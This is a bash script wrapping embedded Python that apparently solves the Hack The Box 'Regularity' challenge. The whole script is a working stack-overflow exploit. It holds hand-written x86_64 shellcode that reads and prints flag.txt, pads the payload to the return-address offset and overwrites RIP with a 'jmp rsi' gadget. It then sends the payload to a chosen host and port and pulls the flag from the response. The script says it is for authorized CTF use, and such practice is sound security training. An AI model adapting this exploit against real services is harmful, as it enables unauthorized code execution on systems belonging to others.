#!/usr/bin/env bash

set -euo pipefail

# -----------------------------------------------------------------------------
# PoC: Hack The Box - Regularity
# Type: Stack overflow -> register-assisted shellcode execution (jmp rsi)
#
# This script is intended for authorized CTF infrastructure only.
# -----------------------------------------------------------------------------

readonly SCRIPT_NAME="$(basename "$0")"
readonly DEFAULT_TIMEOUT=5
readonly DEFAULT_HOST=""
readonly DEFAULT_PORT=""

HOST="${DEFAULT_HOST}"
PORT="${DEFAULT_PORT}"
TIMEOUT="${DEFAULT_TIMEOUT}"
JSON_OUTPUT=0
VERBOSE=0

usage() {
  cat <<USAGE
Usage:
  ${SCRIPT_NAME} <host> <port>
  ${SCRIPT_NAME} --host <host> --port <port> [options]

Options:
  --host <host>         Target host/IP
  --port <port>         Target TCP port
  --timeout <seconds>   Socket timeout (default: ${DEFAULT_TIMEOUT})
  --json                Print result as JSON
  --verbose             Enable debug output
  -h, --help            Show this help message

Exit codes:
  0  Success (flag extracted)
  1  Generic failure
  2  Invalid arguments
  3  Connectivity/request failure
  4  Exploit sent but flag not found
USAGE
}

log_info() {
  if [[ "${JSON_OUTPUT}" -eq 0 ]]; then
    printf '[*] %s\n' "$*" >&2
  fi
}

log_debug() {
  if [[ "${VERBOSE}" -eq 1 && "${JSON_OUTPUT}" -eq 0 ]]; then
    printf '[D] %s\n' "$*" >&2
  fi
}

log_error() {
  printf '[-] %s\n' "$*" >&2
}

parse_args() {
  local positional=()

  while [[ $# -gt 0 ]]; do
    case "$1" in
      --host)
        HOST="${2:-}"
        shift 2
        ;;
      --port)
        PORT="${2:-}"
        shift 2
        ;;
      --timeout)
        TIMEOUT="${2:-}"
        shift 2
        ;;
      --json)
        JSON_OUTPUT=1
        shift
        ;;
      --verbose)
        VERBOSE=1
        shift
        ;;
      -h|--help)
        usage
        exit 0
        ;;
      -*)
        log_error "Unknown option: $1"
        usage >&2
        exit 2
        ;;
      *)
        positional+=("$1")
        shift
        ;;
    esac
  done

  if [[ -z "${HOST}" && ${#positional[@]} -ge 1 ]]; then
    HOST="${positional[0]}"
  fi
  if [[ -z "${PORT}" && ${#positional[@]} -ge 2 ]]; then
    PORT="${positional[1]}"
  fi

  if [[ -z "${HOST}" || -z "${PORT}" ]]; then
    log_error "Host and port are required."
    usage >&2
    exit 2
  fi

  if ! [[ "${PORT}" =~ ^[0-9]+$ ]] || (( PORT < 1 || PORT > 65535 )); then
    log_error "Invalid port: ${PORT}"
    exit 2
  fi
}

main() {
  parse_args "$@"

  log_info "Target: ${HOST}:${PORT}"
  log_debug "Building payload: shellcode + padding + RIP overwrite (jmp rsi @ 0x401041)"

  python3 - "$HOST" "$PORT" "$TIMEOUT" "$JSON_OUTPUT" "$VERBOSE" <<'PY'
import json
import re
import socket
import struct
import sys

host = sys.argv[1]
port = int(sys.argv[2])
timeout = float(sys.argv[3])
json_output = sys.argv[4] == "1"
verbose = sys.argv[5] == "1"


def emit_debug(msg: str) -> None:
    if verbose and not json_output:
        print(f"[D] {msg}", file=sys.stderr)


def fail(code: int, msg: str) -> None:
    if json_output:
        print(json.dumps({"ok": False, "error": msg, "target": f"{host}:{port}"}))
    else:
        print(f"[-] {msg}", file=sys.stderr)
    raise SystemExit(code)


# Linux x86_64 shellcode:
# open("flag.txt", O_RDONLY) -> read -> write(1, ...) -> exit
shellcode = (
    b"\x48\x31\xc0\x50"
    b"\x48\xbb\x66\x6c\x61\x67\x2e\x74\x78\x74"
    b"\x53\x48\x89\xe7"
    b"\x48\x31\xf6\x48\x31\xd2"
    b"\xb0\x02\x0f\x05"
    b"\x48\x89\xc7"
    b"\x48\x89\xe6"
    b"\xba\x60\x00\x00\x00"
    b"\x48\x31\xc0\x0f\x05"
    b"\xbf\x01\x00\x00\x00"
    b"\xb0\x01\x0f\x05"
    b"\xb0\x3c\x48\x31\xff\x0f\x05"
)

offset_to_rip = 0x100
jmp_rsi = 0x401041
payload = shellcode.ljust(offset_to_rip, b"\x90") + struct.pack("<Q", jmp_rsi) + b"TRAILING"

emit_debug(f"Payload length: {len(payload)} bytes")

try:
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(timeout)
    sock.connect((host, port))
except Exception as exc:
    fail(3, f"Connection failed: {exc}")

try:
    try:
        greeting = sock.recv(1024)
        emit_debug(f"Greeting bytes: {len(greeting)}")
    except Exception:
        emit_debug("Greeting not received before timeout; continuing")

    sock.sendall(payload)

    chunks = []
    while True:
        try:
            chunk = sock.recv(4096)
        except socket.timeout:
            break
        if not chunk:
            break
        chunks.append(chunk)

    response = b"".join(chunks)
finally:
    sock.close()

text = response.decode("latin1", "ignore")
match = re.search(r"HTB\{[^}]+\}", text)

if not match:
    if verbose and not json_output:
        print("[D] Response preview:", file=sys.stderr)
        print(text[:500], file=sys.stderr)
    fail(4, "Flag pattern not found in target response")

flag = match.group(0)

if json_output:
    print(json.dumps({"ok": True, "target": f"{host}:{port}", "flag": flag}))
else:
    print(flag)
PY
}

main "$@"
